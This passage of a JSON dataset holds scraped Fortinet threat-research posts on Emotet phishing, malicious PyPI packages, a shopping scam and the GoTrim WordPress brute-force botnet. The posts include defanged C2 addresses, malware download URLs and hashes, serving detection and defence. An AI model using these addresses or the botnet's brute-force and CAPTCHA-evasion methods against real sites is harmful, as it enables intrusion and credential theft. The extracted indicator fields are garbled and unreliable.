anti-analysis/anti-debugging method. When executed, “oxnv[n].ooccxx” is copied to a randomly named directory under “C:\\Windows\\System32” and then renamed to an equally random name. The regsvr32.exe process is restarted to use the renamed file in its new location. Once Emotet is up and running, it attempts to contact one of its Command and Control (C2) server nodes. In this case, 20 possible IPs are used (shown in the IOC section below). The malware loops through each sequentially until contact is made. If the attempts are unsuccessful, it pauses and then cycles through again for as long as required. The spectre of the IRS is not a new phishing lure, especially during tax season. Even though the IRS will never initiate contact with taxpayers by email, few things motivate recipients to act (and, as a result, be less cautious) than thinking the IRS has contacted them. This threat is especially interesting because it was delivered outside the usual time frame for tax-based phishing. It is also a warning that when you receive an unusual email like this, it is best to treat it with caution because Emotet and other similar threat actors will be hoping that fear will cause caution to be abandoned. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signatures detect the malware samples mentioned in this blog MSExcel/Agent. DKF!tr.dldr W32/Emotet. PACA!tr The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. File-based IOCs: K-1 form.zip be2bb6f684cd23a66667a563a78ebfa43de4bb958dc0465a830229a9b927b714 8c3cfdd7e1e162129eedf2c3d9f6f63c133622bfe5d04bccbd823486a85b69ed oxnv[n].ooccxx 9efdbe83c874a14282b0105fcec8dc46d9ba1de6496f5d570fa14915b8fd3285 Network-based IOCs: hXXp://www[.]spinbalence[.]com/admin3693/Z6WQpmNRNj6041fU2zpt/ hXXp://kabaruntukrakyat[.]com/wp-content/ES/ hXXps://chobemaster[.]com/INFECTED/LEdXM4gdwN4mgnlC/ hXXp://cngst[.]com/data/fXWpDbJ3KwAybE/ 45[.]235[.]8[.]30:8080 94[.]23[.]45[.]86:4143 119[.]59[.]103[.]152:8080 169[.]60[.]181[.]70:8080 164[.]68[.]99[.]3:8080 172[.]105[.]226[.]75:8080 107[.]170[.]39[.]149:8080 206[.]189[.]28[.]199:8080 1[.]234[.]2[.]232:8080 188[.]44[.]20[.]25:443 186[.]194[.]240[.]217:443 103[.]43[.]75[.]120:443 149[.]28[.]143[.]92:443 159[.]89[.]202[.]34:443 209[.]97[.]163[.]214:443 183[.]111[.]227[.]137:8080 129[.]232[.]188[.]93:443 139[.]59[.]126[.]41:443 110[.]232[.]117[.]186:8080 139[.]59[.]56[.]73:8080 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. threat research,email phishing,FortiGuards Labs,email threats,emotet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/the-taxman-never-sleeps",
      "scraped_at": "2025-07-20T14:02:19.589539",
      "indicators": {
        "ip_address": [],
        "domain": [
          "RS",
          "xnv4",
          "r",
          "xnv1",
          "egsvr32",
          "orm"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "8c3cfdd7e1e162129eedf2c3d9f6f63c133622bfe5d04bccbd823486a85b69ed",
          "be2bb6f684cd23a66667a563a78ebfa43de4bb958dc0465a830229a9b927b714",
          "9efdbe83c874a14282b0105fcec8dc46d9ba1de6496f5d570fa14915b8fd3285"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.35171102661596965
    }
  },
  {
    "id": "Fortinet_15011",
    "source": "Fortinet",
    "title": "New Supply Chain Attack Uses Python Package Index “aioconsol”",
    "text": "FortiGuard Labs Threat Research Our team has discovered another 0-day attack embedded in a PyPI package (Python Package Index). This one is called “aioconsol.” It was found on December 9, 2022, by monitoring an open-source ecosystem. This Python package was published on December 6, 2022, as shown in its official PyPI repository. As can be seen, all three versions of this malware were published on the same day. Like the “shaderz” zero-day PyPI attack wediscovered and postedlast week, this malicious package does not include a clear description of its project or source page. Version 2.0 of the package includes malicious code in its setup.py installation script that writes what appears to be a binary to a file called “test.exe” and executes it as a part of its installation. In the previous versions, 1.0 and 0.0, a similar malicious code appears in its __init__.py scripts, as shown below. As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e Let’s jump right into the binary exe and run it. It creates a subprocess called ‘stub.exe.’ It drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’, as shown below. This dropped executable ‘stub.exe’ is flagged as malicious by only a handful of vendors (SHA 256): 8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13 After we run test.exe, we see that it copies itself to ‘%USER%\\AppData\\Local\\WindowsControl’ as ‘Control.exe’ and drops a ‘run.bat’ batch file. The run.bat script shows the path to the file ‘Control.exe,’ which may be used to run it at startup. This is the second malicious zero-day Python Package Index (PyPI) supply chain attack we have discovered in less than a week. This technique is often used because malware authors can store an entire binary executable inside a simple python script. This can have drastic effects, potentially damaging your system and exposing users to vulnerabilities. Individuals and organizations need to be wary of installing python packages in the wild as they may include malware. FortiGuard AntiVirusdetects the malicious executables identified in this report as test.exe:W32/PossibleThreat stub.exe:W32/Agent. AHP!tr The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. 52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e 8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13 FortiGuard Labs responsibly disclosed the malicious aioconsol package to Python and it has been removed. threat research,FortiGuards Labs,threat analysis,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-supply-chain-attack-uses-python-package-index-aioconsol",
      "scraped_at": "2025-07-20T14:02:30.087938",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ontrol",
          "tub",
          "un",
          "est",
          "etup"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13",
          "52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5365853658536587
    }
  },
  {
    "id": "Fortinet_78448",
    "source": "Fortinet",
    "title": "Supply Chain Attack via New Malicious Python Package, “shaderz” (Part 2)",
    "text": "FortiGuard Labs Threat Research In this second part of our Shaderz zero-day analysis, we look closely at its downloaded executables. Refer toPart Oneof this blog for more background. To start, we found that this is a multi-stage attack: 1. Stage one – Connect to a suspicious URL to download the executable ‘stub.exe’ using setup.py found in the package 2. Stage two – ‘stub.exe’ downloads another executable called ‘main.exe’ 3. Stage three – executing ‘main.exe’ As we look deeper into the first executable, ‘stub.exe’, we find that it is a 64-bit PyInstaller compiled executable (Python version 3.11). We observed key behaviors from the disassembled Python byte code of ‘stub.exe’ shown below. The ‘main.exe’ executable downloaded from URL hxxps://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe is saved to ‘%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\screen.scr’. It then runs the executable: We can also see it sets autorun for this downloaded executable at startup. The second downloaded executable is where the more malicious behavior happens. Similar toPart Oneof this blog, the download URL https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe includes the following binary exe (SHA 256): d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce As with the previous executable, this download URL has not previously been detected by any other threat researchers. However, some vendors flag this downloaded executable file as malicious, as shown below. This executable is also a 64-bit PyInstaller compiled executable (Python version 3.11). As shown below, it uses a powerful Python obfuscator called Hyperion in its Python byte code. One suspicious behavior conducted by ‘main.exe’ is creating a series of text and DB files in the ‘%USERPROFILE%\\AppData\\Local\\Temp’ folder. It then stealthily records sensitive user data and credentials. When we look into any of these text files, we see that the malware names itself ‘Subliminal Stealer.’ Let’s take a look at the DB files below. We can safely assume that they are used for saving sensitive data and credentials, such as credit card and log-in information. Individuals need to be wary of installing python packages in the wild as they may have potential malicious behaviors hidden within. As this blog series demonstrates, malware authors are often able to use what seems like a benign package to prey on victims. We will continue monitoring new open-source packages and report malicious packages to help prevent users from becoming victims of a supply chain attack. FortiGuard AntiVirus detects the malicious executable identified in this report as W64/Agent.7EC7!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects it as malicious and blocks the download URL cited in this report. d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. threat research,FortiGuards Labs,threat analysis,zero-day research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-package-shaderz-part-2",
      "scraped_at": "2025-07-20T14:02:36.818317",
      "indicators": {
        "ip_address": [],
        "domain": [
          "etup",
          "tub",
          "creen",
          "ain"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://cdn"
        ]
      },
      "threat_score": 0.3854389721627409
    }
  },
  {
    "id": "Fortinet_13259",
    "source": "Fortinet",
    "title": "Want to Know What’s in That Online Mystery Box? NOTHING AT ALL",
    "text": "FortiGuard Labs Threat Research The holidays are upon us, and in some parts of the world, the month of December (especially in North America) is when many retailers earn the bulk of their revenue. Because the holiday season includes gift giving and sales on desirable merchandise, individuals tend to spend more money than average. At the same time, retailers, small businesses, and mom-and-pop stores also spend more money to stock their shelves. Affected Platforms:N/AImpacted Parties:Online ShoppersImpact:Loss of personally identifiable information and/or moneySeverity Level:Low Because the online marketplace is so competitive, many online retailers offer free shipping and returns during this period. But with increased sales comes an increase in returns and exchanges. The volume of online returns has been increasing steadily over the past five years. Online returns jumped from10.6% in 2020 to 16.6% in 2021—an overall $761 billion dollar increase. This year, however, many online retailers have curtailed these benefits,citing inflation and lower profits. But despite this change, when combined with the sheer volume of sales in brick-and-mortar stores, the number of returns is still expected to rise. And rather than repackaging these items for resale, many returns are sent to logistic companies that bundle and sell them in bulk, often for pennies on the dollar. This has created a burgeoning second-hand market. These outlets usually resell returns, overstocks, slightly damaged, and used items purchased in bulk from retailers nationwide, often at a steep discount. These stores provide a benefit for the consumer and the environment since many returned products otherwise often end up being incinerated or tossed into a landfill. Shoppers have been flocking to these new sites looking for great deals on holiday purchases. And as you might expect, scammers and bad actors have also seized on this trend. OurFortiGuard Labsteam has uncovered a growing number of scams related to the resale of used or returned items. The example below emphasizes the need to be cyber-aware this shopping season, whether you are purchasing something for yourself, a loved one, or your business. One common technique for reselling returned and overstocked items is to sell mystery items in large boxes or pallets. Social media is filled with videos showing excited consumers opening pallets that contain items of significant value, like iPhones and computers, that were purchased online for a few hundred dollars. These posts have contributed to the interest and frenzy. Many of these are scams. The sheer amount of interest, demonstrated by the volume of trending hashtags on social media, has created an opportunity for threat actors to try and capitalize on unknowing victims. One such scam seeing rapid growth is the Amazon pallet scam, also known as mystery boxes, bulk return pallets, etc. The following example is a paid advertisement we recently came across on the default Microsoft start page built into Windows 10: Clicking on the top left advertisement, “Amazon’s unclaimed high-end electronics mystery boxes are being sold at bar [sic],” takes us to the website fundelivereddss[.]com: The landing page appears convincing to the untrained eye, showing a large warehouse with brown boxes stacked on pallets: The viewer is then presented with an interstitial (an inserted web page that displays advertising) that highlights someone in “Conroe” who purchased a return tool pallet only a minute after visiting the site: Clicking on the interstitial brings us to the following page: The intended victim is presented with several options and brands to choose from, including size, quantity, and price: Typical red flags seen on scam sites are grammatical errors, typos, the misuse of punctuation and spacing, inconsistent logos, etc. This is often due to the fact that the scammers are trying to get their site online as fast as possible to start making money or that the bad actors are non-native English speakers. In this case, we can see that the phrase “Customer Review(40)” at the top of the pages is missing pluralization and does include a space between the word “Review” and the parentheses symbol: The first review also contains a fragmented and incoherent review that indicates that the writer is likely a non-native speaker: It's great to witness his arrival together at this moment. I recommend this store, please don't buy from other stores because I fell down in other places. Some forensics analysis of the photo shows it was taken from Twitter from an electrical contractor based in the United States: Another clue is that the domain fundelivereddss[.]com was only registered on October 29th. Recently registered domains are often hallmarks of a potential scam, popping up and then disappearing in time with an event, such as the holidays or the World Cup. Threat actors also know that search engine ranking for their new site will be low, so they use social media promotion to get these sites in front of potential victims. Another clue we observed was found within the privacy policy page. It includes a reference to herbertm[.]shop. This indicates that this template was likely reused by the same actor. To test this theory, we visited herbertm[.]shop to see what it contains. This page appears to be selling fashion items. However, we also see a floating interstitial that appears to be the last chance to order what appears to be Amazon returns: When viewing the link, we found it contains Amazon and EBay references: Amazon and eBay backlog, picking, liquidation 【Temporary sale】 (herbertm[.]shop) https://www.herbertm[.]shop/products/products-amazon-and-ebay-backlog-picking-liquidation-temporary-sale?sales_pop=true&spm=..index.0.1 Unfortunately, when we clicked on the link, we found that the page no longer exists, so at this point we don’t have any evidence that this was another pallet scam. However, the pattern used in the herbertm[.]shop and Fundelivereddss[.]com sites and the cross-reference between the two in the privacy policy indicates these were set up by the same perpetrators. So we kept looking. While a Google cache disn’t provide us with any clues, looking at scamadviser.com revealed negative reviews from victims of herbertm[.]shop that make the connection clearer: It appears that some victims of the herbertm[.]shop scam site ordered large pallets as well as individual items. And it also appears from the complaints that some victims were offered a bait and switch. For example, some that had ordered a specific item only had a cheap unrelated item sent to them. And for the pallet scams, one victim stated they only received a video game controller instead of the pallet, and another claimed to have ordered two pallets for $89.98 but did not receive anything. Creating professional-looking websites has never been easier. Many eCommerce platforms come preconfigured with design templates, shopping carts, and payment gateways. Because of this, sites can literally be online within moments. Gone are the barriers that required a retailer to know how to develop a website, figure out how to plug in a payment gateway, and design or incorporate shopping carts into a website. Even the need to work with a bank to process credit cards has been replaced with third-party services that handle billing, simplifying the process for both the entrepreneur and scammer alike. Things to watch out for when shopping online: When shopping online, there are a number of things you need to check, especially if the site you are shopping at is not a well-known brand. Domain age. If the domain is less than a few months old, the likelihood that it is a scam website is very high. Many search engines penalize new sites and will not rank them, which means you likely arrived there through some sort of phishing scam. Older sites tend to be owned by more reputable companies, meaning they are less likely to be scams (unless the domain has expired). They are also ranked higher due to the fact that it takes investment to keep a site up and running, so they show up first when running an online search for an item. Promoted on social media or paid advertisements. This is another giveaway. Just because an advertisement is on a major social media platform or search engine does not mean it is legitimate. Often, advertisements on a page are curated by a third party. Using this strategy, combined with hashtags and other keywords curated for their target audience, helps create a sense of credibility that allows bad actors to connect with their victims. It Is also a lot easier to market to victims this way if thire site is new. Outlandish claims.“This is not a scam!” “You will not regret it!” Phrases like these are psychological ploys designed to create FOMO, or fear of missing out, in their victims. Do your own due diligence when purchasing items from lesser-known sellers. Grammatical issues. This is a major red flag. Legitimate sites, especially those intending to stay in business, employ copy editors to ensure proper grammar, punctuation, and spelling. Although not necessarily always true (mistakes do happen), egregious grammatical errors in web copy often indicate it was written by someone who is not a native speaker, which is a warning sign that warrants further investigation. Unusually low prices. Unusually low pricing is often another warning sign. How likely is it that a retailer like Amazon would be willing to let go of thousands of dollars’ worth of high-end products for less than ten percent of their value? High-value items may end up in unsorted returns, but it is rare. And unlike the claims in Figure 6, these returns are usually not collated by brand. Instead, their inclusion is often random and items are returned in various conditions. All websites mentioned in this blog are blocked by theFortiGuard Web Filtering client. Fortinet Web Filtering includes two filtering categories that can be used to protect against newly created pages: - Newly Registered Domain Domains that were very recently registered - Newly Observed Domain Domains that are newly configured or newly active, but not necessarily newly registered. By enabling blocking of these sites, you can avoid exploitation by sites with little or no reputation. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. holiday shopping,FortiGuards Labs,online shopping,scams Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/want-to-know-whats-in-that-online-mystery-box-nothing-at-all",
      "scraped_at": "2025-07-20T14:02:43.964605",
      "indicators": {
        "ip_address": [],
        "domain": [
          "camadviser",
          "ww"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "https://www.herbertm"
        ]
      },
      "threat_score": 0.05934718100890207
    }
  },
  {
    "id": "Fortinet_88508",
    "source": "Fortinet",
    "title": "GoTrim: Go-based Botnet Actively Brute Forces WordPress Websites",
    "text": "FortiGuard Labs Threat Research FortiGuard Labsrecently encountered a previously unreported Content Management System (CMS) scanner and brute forcer written in the Go programming language (also commonly referred to as Golang). We took a closer look at this malware because it was being described in several online forums as being installed in compromised WordPress sites, but there were no publicly available analysis reports. Golang brute forcers are not new. For example, we previously reported on theStealthWorkercampaign in 2019. This new brute forcer is part of a new campaign we have named GoTrim because it was written in Go and uses “:::trim:::”to split data communicated to and from the C2 server. Similar to StealthWorker, GoTrim also utilizes abot networkto perform distributed brute force attacks. The earliest sample we found was from Sep 2022. That campaign is still ongoing at the time of writing. This article details how this active botnet scans and compromises websites using WordPress and OpenCart. We also highlight some differences between samples collected from Sep to Nov 2022 at the end of the article. GoTrim uses a bot network to perform distributed brute force attacks against its targets. Each bot is given a set of credentials to use to attempt to log into a long list of website targets. After a successful login, a bot client is installed into the newly compromised system. It then awaits further commands from the threat actors, thereby expanding the bot network. GoTrim only reports credentials to the C2 server after a successful brute force attempt. We did not observe any code in GoTrim for propagating itself or deploying other malware. However, we did find PHP scripts that download and execute GoTrim bot clients. It seems likely that the threat actor is somehow abusing compromised credentials to deploy PHP scripts to infect systems with GoTrim. Typically, each script downloads the GoTrim malware from a hardcoded URL to a file in the same directory as the script itself and executes it. To cover its tracks, both the downloader script and GoTrim brute forcer are deleted from the infected system. It does not maintain persistence in the infected system. Analysis detailed in this article is based on a sample with SHA-256 hash c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3, unless stated otherwise. GoTrim is built with Go version 1.18. As with all Go applications, all third-party libraries used in the code are statically linked to the malware, resulting in a relatively bigger file size for the executable binary. But this has the advantage of not depending on any external files to execute correctly. To solve the size issue, the malware is packed using UPX to reduce the file from 6 MB to 1.9 MB. Another advantage of using Go is that the same source code can be cross-compiled to support different architectures and Operating Systems. Based on the source code paths in the samples, Windows was used during the development of GoTrim. However, we have only observed samples targeting 64-bit Linux in the wild. GoTrim can communicate with its Command and Control (C2) server in two ways: a client mode, where it sends HTTP POST requests to the Command and Control (C2 server), or a server mode, where it starts an HTTP server to listen for incoming POST requests. All data exchanged with the C2 is encrypted using the Advanced Encryption Standard in Galois Counter Mode (AES-GCM) with a key derived from a passphrase embedded in the malware binary. By default, GoTrim attempts to run in server mode if the infected malware is directly connected to the Internet—that is, if the victim's outbound orlocal IP addressis non-private. Otherwise, it switches to client mode. Upon execution, GoTrim creates an MD5 hash representing a unique identification for the infected machine (bot ID). This is generated from the following string containing several pieces of information delimited by the “:” character: VICTIM_EXTERNAL_IP:HTTP_SERVER_PORT:1:OUTBOUND_IP:AES_PASSPHRASE After generating the bot ID, GoTrim creates an asynchronous Go routine (similar to multithreading) that sends a beacon request to the C2 server on both client and server modes. The C2 request URLs change between versions, as discussed in a later section of this article. For this particular sample, the beacon request URL is “/selects?dram=1”. In this beacon request, several pieces of victim and bot information are sent to the C2 server, as seen in Figure 3. Some of the interesting fields sent in the beacon request include the following: 1. Bot ID: unique ID for the bot2. External IP: public IP address of the victim machine3. HTTP Server Port: randomly generated port for the HTTP server (0 in client mode)4. Malware Initialization Flag: always set to 1 by the time this request is made5. Outbound IP: local IP address of the victim machine6. Status Message: The “GOOD” message is replaced by other strings that report the status of any running CMS detection or brute forcing tasks during subsequent beacon requests.7. Status Flags: These indicate whether the malware currently has any processing tasks assigned by the C2 server and the IDs of these tasks8. MD5 Checksum: This value is generated from parts of the above request and the hardcoded AES passphrase. It serves as a message integrity checksum. The fields are joined together with the:::trim:::string, hence the name chosen for this campaign. The data is then encrypted using an AES-256-GCM key, the SHA-256 hash of the previously mentioned passphrase. The server usually responds with “OK”, “404 page not found”, or “BC”, all encrypted with the same AES-GCM key. When “BC” is received, GoTrim will regenerate its bot ID and switch from server to client mode. The first beacon request is to register a new bot (victim) to the bot network. After each beacon request, GoTrim sleeps between a few seconds to several minutes, depending on the C2 server response and whether the malware is currently working on C2-assigned tasks before sending the next request. The malware regularly performs this beacon request to update the C2 server about the bot's status, including successful credentials, as discussed in the brute forcing section of the article. If GoTrim fails to receive a valid response from the C2 server after 100 retries, it will terminate itself. While the beacon requests are being sent asynchronously to update the C2 server on its status, GoTrim either sends a request to the C2 server to receive commands (client mode) or sets up an HTTP server to listen for incoming tasking requests (server mode). In client mode, the malware sends a POST request to “/selects?bilert=1” to receive commands from the C2 server. The C2 server responds with the command encrypted with the same AES-GCM key. An example of a decrypted command can be seen below in Figure 4. After splitting the data by the “:::trim:::” string, seven fields can be identified, as listed below. 1. MD5 Checksum: used for checking message integrity, e.g., 83217f8b39dccc2f9f2a0157f0236c4f2. Command ID: This indicates the command for the current task3. Concurrency Level: This affects how many goroutines are executed for each task4. Command Options: This contains options for the commands, separated by 7E 6A 71 6D 70 C2 A9 (~jqmp©) bytes. They are interpreted differently depending on the command: a. Target List: This is GZIP-compressed data, which, when decompressed, contains a list of domains that will be the target for the login attempts.b. Command Option 1(redacted): This option contains the username for authentication commands. Instead of using the same username for each domain, the C2 server can specify a series of bytes, like C2 A9 64, to use the domain as the username.c. Command Option 2(redacted): For authentication commands, this option contains the passwordd. Command Option 3: Unknown option for WordPress authenticatione. Command Option 4: Option for WordPress authentication to use either POST request or XML-RPC when submitting credentials. 5. Internal Values: Numeric values that are not used by the malware itself (e.g.,42and255) and likely represent internal tasking IDs for the current command. The malware supports the following commands: We have observed a target list containing up to 30,000 domains in a single WordPress authentication command. Additionally, we observed that authentication commands only provide a single password to test against all the domains in the list. As mentioned above, brute forcing is likely distributed by commanding a network of infected machines to test different domains and credentials. After the malware has completed processing a command, it sleeps for a while before sending another POST request to receive a new task from the C2 server. In server mode, GoTrim starts a server on a random port between 4000 to 7999 to respond to incoming POST requests sent by the threat actor. This mode gives the threat actor a more responsive way of communicating with the bot. For instance, the status of the bots can be checked by the threat actor without waiting for the subsequent beacon request by simply sending a POST request to a specific URL handled by the bot’s HTTP server. To issue a command to the machine, the threat actor sends a POST request to “/BOT_ID?lert=1” with the body containing the AES-256-GCM encrypted command data, similar to the response provided by the C2 server when the client requests commands (Figure 4). Server mode supports the same commands as client mode. The threat actor can also send a request with the parameter \"/BOT_ID?intval=1” to view the status of currently running tasks and whether assigned tasks have been completed. When CPU utilization is below a certain level (75% or 90%, depending on the number of concurrent workers used for the current task), a separate goroutine is spawned to process each domain. GoTrim attempts to identify whether one of the four CMSes (WordPress, Joomla!, OpenCart, or DataLife Engine) is being used on the target website. It does this by checking for specific strings in the webpage content. Interestingly, it only targets self-hosted WordPress websites by checking the Referer HTTP header for “wordpress.com”. As managed WordPress hosting providers, such as wordpress.com, usually implement more security measures to monitor, detect, and block brute forcing attempts than self-hosted WordPress websites, the chance of success is not worth the risk of getting discovered. The strings used for determining the installed CMS are listed below. DataLife Engine While GoTrim can detect websites using the four CMSes above, it currently only supports authenticating against WordPress and OpenCart websites. This indicates that this botnet is still under development. Aside from the username provided by the C2 server, it attempts to gather more usernames by sending a GET request to “/wp-json/wp/v2/users”. After that, it tries to log in to the WordPress website using the list of usernames and the password provided in the C2 command by sending a POST request to “/wp-login.php”. Figure 5 shows an example of the POST request for logging in. This request causes a redirect to the admin page of the WordPress website (i.e.,/wp-admin) after a successful login. To confirm that the login and redirection were successful, it checks to see if the response contains “id=\\\"adminmenumain\\”. The C2 server can also specify the authentication to be performed via the WordPress XML-RPC feature, which is another way for users to programmatically interact with the CMS remotely using XML. By communicating directly with the web server’s backend, anti-bot mechanisms such as captchas that usually work when accessing the website pages could be bypassed. After a successful login, the following information (delimited by “|”) is updated into a global status message and sent with the following request to the C2 (client mode) or in the response to incoming requests (server mode): GoTrim can also brute force websites running the open-source e-commerce platform OpenCart. It sends a GET request to the target’s “/admin/index.php” and collects the authentication-related tokens and headers needed for the login request. It then performs the actual authentication by sending a POST request to the same URL with form-encoded data containing the username and the password. To verify that the login request was successful, it checks if the website returned an OpenCart user token by searching for “/dashboard&user_token=” and making sure the “redirect” value from the received data is not empty. A valid authentication response should look like the following: {\"redirect\":\"https://example.com/opencart/admin/index.php?route=common/dashboard&user_token=USER_TOKEN_HASH\"} Upon successful login, the global status message is updated for WordPress brute-forcing. GoTrim can detect anti-bot techniques used by web hosting providers and CDNs, such as Cloudflare and SiteGround, and evade some of their simpler checks. It tries to mimic legitimate requests from Mozilla Firefox on 64bit Windows by using the same HTTP headers sent by the browser and supporting the same content encoding algorithms: gzip, deflate, and Brotli. For WordPress websites, it also detects whether CAPTCHA plugins are installed. The malware contains code to solve the CAPTCHA for some of these plugins. However, we need to verify if the bypass techniques work. We determined that it cannot bypass Google, WP Limit Login Attempts, and Shield Security’s CAPTCHAs. In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses “3GOOD” for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string “1gb.ru” within the page content, GoTrim also sends the same “3GOOD” brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs “/selects?param=1” and “/selects?walert=1” on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered. A version of the binary that appeared in November 2022 also updated its HTTP POST URLs (Figure 7). The beacon request URL “/selects?dram=1” and the command request URL “/selects?bilert=1” have been changed to “/route?index=1” and “/route?alert=1”, respectively. The encryption algorithm and keys used in the data transmission remain the same. Although this malware is still a work in progress, the fact that it has a fully functional WordPress brute forcer combined with its anti-bot evasion techniques makes it a threat to watch for—especially with the immense popularity of the WordPress CMS, which powers millions of websites globally. Brute-forcing campaigns are dangerous as they may lead to server compromise and malware deployment. To mitigate this risk, website administrators should ensure that user accounts (especially administrator accounts) use strong passwords. Keeping the CMS software and associated plugins up to date also reduces the risk of malware infection by exploiting unpatched vulnerabilities. FortiGuard Labs will continue to monitor GoTrim’s development. The FortiGuard Antivirus service detects and blocks this threat asELF/GoTrim!trandPHP/GoTrim!tr.dldr. TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. FortiGuard Labs provides theGoTrim. BotnetIPS signature against GoTrim C2 activity. TheFortiGuard Web FilteringService blocks the C2 servers and download URLs cited in this report. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. 646ea89512e15fce61079d8f82302df5742e8e6e6c672a3726496281ad9bfd8a 4b6d8590a2db42eda26d017a119287698c5b0ed91dd54222893f7164e40cb508 c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3 71453640ebf7cf8c640429a605ffbf56dfc91124c4a35c2ca6e5ac0223f77532 3188cbe5b60ed7c22c0ace143681b1c18f0e06658a314bdc4c7c4b8f77394729 80fba2dcc7ea2e8ded32e8f6c145cf011ceb821e57fee383c02d4c5eaf8bbe00 De85f1916d6102fcbaceb9cef988fca211a9ea74599bf5c97a92039ccf2da5f7 2a0397adb55436efa86d8569f78af0934b61f5b430fa00b49aa20a4994b73f4b Download URLs hxxp://77[.]73[.]133[.]99/taka hxxp://77[.]73[.]133[.]99/trester hxxp://77[.]73[.]133[.]99/pause hxxp://77[.]73[.]133[.]99 hxxp://77[.]73[.]133[.]99/selects?dram=1 hxxp://77[.]73[.]133[.]99/selects?bilert=1 hxxp://77[.]73[.]133[.]99/route?index=1 hxxp://77[.]73[.]133[.]99/route?alert=1 hxxp://89[.]208[.]107[.]12 hxxp://89[.]208[.]107[.]12/selects?param=1 hxxp://89[.]208[.]107[.]12/selects?walert=1 brute force attack,wordpress,FortiGuards Labs,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/gotrim-go-based-botnet-actively-brute-forces-wordpress-websites",
      "scraped_at": "2025-07-20T14:02:52.780197",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ordpress",
          "p-login",
          "ndex",
          "r",
          "gb",
          "xample"
        ],
